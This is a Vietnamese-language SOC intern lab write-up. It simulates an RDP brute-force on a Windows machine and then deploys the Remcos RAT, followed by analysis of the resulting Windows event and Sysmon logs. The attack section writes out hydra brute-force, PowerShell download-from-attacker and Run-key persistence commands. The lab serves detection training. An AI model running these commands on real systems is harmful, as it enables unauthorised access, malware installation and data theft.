# SOC Analyst Intern Project - RDP Brute-force & Remcos RAT Attack Simulation

# Mô tả Dự Án
Dự án mô phỏng kịch bản tấn công vào hệ thống Windows bằng phương pháp brute-force dịch vụ RDP, sau đó triển khai mã độc Remcos (Remote Access Trojan) để thực hiện Remote Code Execution (RCE), đánh cắp file và xóa dấu vết. Bài lab nhằm rèn luyện kỹ năng phát hiện, điều tra và phân tích sự cố trong vai trò SOC Analyst.

# Môi Trường Thực Hiện

# Windows 10 (IP: 192.168.1.5)
   - Tắt Windows Firewall
   - Bật Remote Desktop (RDP), mở port 3389
# Kali Linux (IP: 192.168.1.137)
   - Mã độc Remcos v6.1.0 Light (tải từ trang chủ Remcos)
# Điều kiện 2 máy ping được nhau
# I,Các Bước Thực Hiện
# 1. Khai Thác Brute-force Dịch Vụ RDP

Tạo file user.txt và pass.txt trên Kali

Sử dụng nmap để quét cổng 3389:

nmap -p 3389 192.168.1.5

Sử dụng hydra brute-force RDP:

hydra -t 1 -w 3 -L user.txt -P pass.txt rdp://192.168.1.5

Kết quả thành công:

Username: nhatnm

Password: 23032004

# 2. Triển Khai Mã Độc Remcos

Dựng HTTP server bằng Python:

python3 -m http.server 8000

Tải mã độc từ máy Kali về máy Windows:

powershell -c "Invoke-WebRequest -Uri http://192.168.1.137:8000/'Remcos v6.1.0 Light.exe' -OutFile C:\Users\Public\remcos.exe"

Thêm registry để thiết lập persistence:

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v remcos /t REG_SZ /d "C:\Users\Public\remcos.exe"

# 3. Thực Thi Tấn Công RCE và Xóa File

Thực hiện điều khiển từ xa qua Remcos

Đánh cắp file matma.txt từ thư mục: C:\Users\<user>\Desktop\bimat\

Xóa file gốc sau khi lấy cắp thành công

# Ii,Phân Tích LOG Sau Tấn Công

# 1. Phân Tích Log Windows

Event ID 4625: Nhiều lần đăng nhập thất bại (brute-force)

Event ID 4624: Đăng nhập thành công từ xa qua RDP

Sysmon ID 3: Ghi nhận kết nối mạng bất thường

Sysmon ID 1: Ghi nhận quá trình thêm registry (persistence)

# 2. Kết Luận

Nguồn tấn công: 192.168.1.137 (máy Kali)

Đích: 192.168.1.5 (máy Windows)

Cổng: 43064

Hostname tấn công: nhat.lan

Các giai đoạn:

Brute-force mật khẩu

Đăng nhập thành công

Cài đặt và thực thi Remcos RAT

RCE, đánh cắp dữ liệu và xóa file



